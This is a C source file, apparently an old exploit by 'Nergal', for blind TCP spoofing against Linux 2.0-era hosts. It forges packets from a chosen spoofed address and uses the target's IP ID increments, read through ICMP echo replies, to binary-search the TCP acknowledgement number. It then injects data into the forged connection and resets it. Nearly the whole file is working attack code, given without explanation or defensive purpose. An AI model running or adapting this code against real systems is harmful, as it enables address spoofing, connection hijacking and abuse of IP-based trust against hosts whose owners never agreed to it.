/* by Nergal */

  #include "libnet.h"
  #include <netinet/ip.h>
  #include <netdb.h>
  int sock, icmp_sock;
  int packid;
  unsigned int target, target_port, spoofed, spoofed_port;
  unsigned long myaddr;
  int
  get_id ()
{
    char buf[200];
    char buf2[200];
    int n;
    unsigned long addr;
    build_icmp_echo (ICMP_ECHO, 0, getpid (), 1, 0, 0, buf + IP_H);
    build_ip (ICMP_ECHO_H, 0, packid++, 0, 64, IPPROTO_ICMP, myaddr,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_ICMP, ICMP_ECHO_H);
    write_ip (sock, buf, IP_H + ICMP_ECHO_H);
    do
      {
        n = read (icmp_sock, buf2, 200);
        addr = ((struct iphdr *) buf2)->saddr;
      }
    while (addr != target);
    return ntohs (((struct iphdr *) buf2)->id);
}

    static int first_try;


  int
  is_bigger ()
{
    static unsigned short id = 0, tmp;
    usleep (10000);
    tmp = get_id ();
    if (tmp == id + 1)
      {
        id = tmp;
        return 0;
      }
    else if (tmp == id + 2)
      {
        id = tmp;
        return 1;
      }
    else
      {
        if (first_try)
          {
            id = tmp;
            first_try = 0;
            return 0;
          }
        fprintf (stderr, "Unexpected IP id, diff=%i\n", tmp - id);
        exit (1);
      }
}

  void
  probe (unsigned int ack)
{
    char buf[200];
    usleep (10000);
    build_tcp (spoofed_port, target_port, 2, ack, 16, 32000, 0, 0, 0, buf + IP_H);
    build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H);
    write_ip (sock, buf, IP_H + TCP_H);
}

  void
  send_data (unsigned int ack, char *rant)
{
    char * buf=alloca(200+strlen(rant));
    build_tcp (spoofed_port, target_port, 2, ack, 16, 32000, 0, rant, strlen
  (rant), buf + IP_H);
    build_ip (TCP_H + strlen (rant), 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H + strlen (rant));
    write_ip (sock, buf, IP_H + TCP_H + strlen (rant));
}

  void
  send_syn ()
{
    char buf[200];
    build_tcp (spoofed_port, target_port, 1, 0, 2, 32000, 0, 0, 0, buf + IP_H);
    build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H);
    write_ip (sock, buf, IP_H + TCP_H);
}

  #define MESSAGE "Check out netstat on this host :)\n"


  void
  send_reset ()
{
    char buf[200];
    build_tcp (spoofed_port, target_port, 4 + strlen (MESSAGE), 0, 4, 32000, 0, 0,
  0, buf + IP_H);
    build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
              target, 0, 0, buf);
    do_checksum (buf, IPPROTO_TCP, TCP_H);
    write_ip (sock, buf, IP_H + TCP_H);
}


  #define LOTS ((unsigned int)(1<<30))
  main (int argc, char **argv)
{
    unsigned int seq_low = 0, seq_high = 0, seq_toohigh, seq_curr;
    int i;
    char myhost[100];
    struct hostent *ht;
    if (argc != 5)
      {
        printf ("usage:%s target_ip target_port spoofed_ip spofed_port\n",
  argv[0]);
        exit (1);
      }
    gethostname (myhost, 100);
    ht = gethostbyname (myhost);
    if (!ht)
      {
        printf ("Your system is screwed.\n");
        exit (1);
      }
    myaddr = *(unsigned long *) (ht->h_addr);
    target = inet_addr (argv[1]);
    target_port = atoi (argv[2]);
    spoofed = inet_addr (argv[3]);
    spoofed_port = atoi (argv[4]);
    sock = open_raw_sock (IPPROTO_RAW);
    icmp_sock = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock <= 0 || icmp_sock <= 0)
      {
        perror ("raw sockets");
        exit (1);
      }
    packid = getpid () * 256;
    fprintf(stderr,"Checking for IP id increments\n");
  first_try=1;
    for (i = 0; i < 5; i++)
      {
      is_bigger ();
      sleep(1);
      fprintf(stderr,"#");
      }
    send_syn ();
    fprintf (stderr, "\nSyn sent, waiting 33 sec to get rid of resent
  SYN+ACK...");
    for (i = 0; i < 33; i++)
      {
        fprintf (stderr, "#");
        sleep (1);
      }
    fprintf (stderr, "\nack_seq accuracy:");
  first_try=1;
    is_bigger();
    probe (LOTS);
    if (is_bigger ())
      seq_high = LOTS;
    else
      seq_low = LOTS;
    probe (2 * LOTS);
    if (is_bigger ())
      seq_high = 2 * LOTS;
    else
      seq_low = 2 * LOTS;
    probe (3 * LOTS);
    if (is_bigger ())
      seq_high = 3 * LOTS;
    else
      seq_low = 3 * LOTS;
    seq_toohigh = seq_high;
    if (seq_high == 0 || seq_low == 0)
      {
        fprintf (stderr, "Non-listening port or not 2.0.x machine\n");
        send_reset ();
        exit (0);
      }

    do
      {
        fprintf (stderr, "%i ", (unsigned int) (seq_high - seq_low));
        if (seq_high > seq_low)
          seq_curr = seq_high / 2 + seq_low / 2 + (seq_high % 2 + seq_low % 2) / 2;
        else
          seq_curr = seq_low + (unsigned int) (1 << 31) - (seq_low - seq_high) / 2;
        probe (seq_curr);
        if (is_bigger ())
          seq_high = seq_curr;
        else
          seq_low = seq_curr;
        probe (seq_toohigh);
        if (!is_bigger ())
          break;
	//      getchar();
      }
    while ((unsigned int) (seq_high - seq_low) > 1);
    fprintf (stderr, "\nack_seq=%u, sending data...\n", seq_curr);
    send_data (seq_curr, MESSAGE);
    fprintf (stderr, "Press any key to send reset.\n");
    getchar ();
    send_reset ();

}
